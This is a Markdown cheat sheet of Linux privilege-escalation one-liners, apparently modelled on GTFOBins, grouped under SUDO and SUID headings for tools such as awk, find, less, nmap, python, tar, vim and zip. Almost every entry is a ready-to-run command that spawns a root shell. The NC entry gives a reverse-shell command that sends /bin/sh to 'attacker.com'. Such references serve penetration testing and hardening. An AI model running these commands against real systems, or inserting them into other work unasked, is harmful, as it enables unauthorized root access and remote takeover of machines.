[AWK](#AWK)
[BASH](#BASH)
[ENV](#ENV)
[FIND](#FIND)
[FTP](#FTP)
[LESS](#LESS)
[MAN](#MAN)
[MORE](#MORE)
[NANO](#NANO)
[NC](#NC)
[NMAP](#NMAP)
[PERL](#PERL)
[PYTHON](#PYTHON)
[RUN-PARTS](#RUN-PARTS)
[TAR](#TART)
[TIME](#TIME)
[VI](#VI)
[VIM](#VIM)
[ZIP](#ZIP)





# AWK
### SUDO
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

### SUID
```
sudo sh -c 'cp $(which awk) .; chmod +s ./awk'

./awk 'BEGIN {system("/bin/sh")}'

```

# BASH
### SUDO
```
sudo bash
```
### SUID
```
sudo sh -c 'cp $(which bash) .; chmod +s ./bash'

./bash -p
```
# ENV
### SUDO
```
sudo env /bin/sh
```
### SUID
```
sudo sh -c 'cp $(which env) .; chmod +s ./env'

./env /bin/sh -p
```
# FIND
### SUDO
```
sudo find . -exec /bin/sh \; -quit
```
### SUID
```
sudo sh -c 'cp $(which find) .; chmod +s ./find'

./find . -exec /bin/sh -p \; -quit
```
# FTP
### SUDO
```
sudo ftp
!/bin/sh
```
# LESS
### SUDO
```
sudo less /etc/profile
!/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which less) .; chmod +s ./less'

./less file_to_read
```
# MAN
### SUDO
```
sudo man man
!/bin/sh
```
# MORE
### SUDO
```
TERM= sudo -E more /etc/profile
!/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which more) .; chmod +s ./more'

./more file_to_read
```

# NANO
### SUDO
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
### SUID
```
sudo sh -c 'cp $(which nano) .; chmod +s ./nano'

./nano
^R^X
reset; sh 1>&0 2>&0
```
# NC
### SUDO
```
# Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.

RHOST=attacker.com
RPORT=12345
sudo nc -e /bin/sh $RHOST $RPORT
```

# NMAP
### SUDO
```
#   Input echo is disabled.

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

#   The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

sudo nmap --interactive
nmap> !sh
```
### SUID
```
sudo sh -c 'cp $(which nmap) .; chmod +s ./nmap'

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF
```
# PERL
### SUDO
```
sudo perl -e 'exec "/bin/sh";'
```
### SUID
```
sudo sh -c 'cp $(which perl) .; chmod +s ./perl'

./perl -e 'exec "/bin/sh";'
```
# PYTHON
### SUDO
```
sudo python -c 'import os; os.system("/bin/sh")'
```
### SUID
```
sudo sh -c 'cp $(which python) .; chmod +s ./python'

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
# RUN-PARTS
### SUDO
```
sudo run-parts --new-session --regex '^sh$' /bin
```
### SUID
```
sudo sh -c 'cp $(which run-parts) .; chmod +s ./run-parts'

./run-parts --new-session --regex '^sh$' /bin --arg='-p'
```
# TAR
### SUDO
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
### SUID
```
sudo sh -c 'cp $(which tar) .; chmod +s ./tar'

./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
# TIME
### SUDO
```
sudo /usr/bin/time /bin/sh
```
### SUID
```
sudo sh -c 'cp $(which time) .; chmod +s ./time'

./time /bin/sh -p
```
# VI
### SUDO
```
sudo vi -c ':!/bin/sh' /dev/null
```
# VIM
### SUDO
```
sudo vim -c ':!/bin/sh'
```
### SUID
```
sudo sh -c 'cp $(which vim) .; chmod +s ./vim'

./vim -c ':lua os.execute("reset; exec sh")'
```
# ZIP
### SUDO
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
### SUID
```
sudo sh -c 'cp $(which zip) .; chmod +s ./zip'

TF=$(mktemp -u)
./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
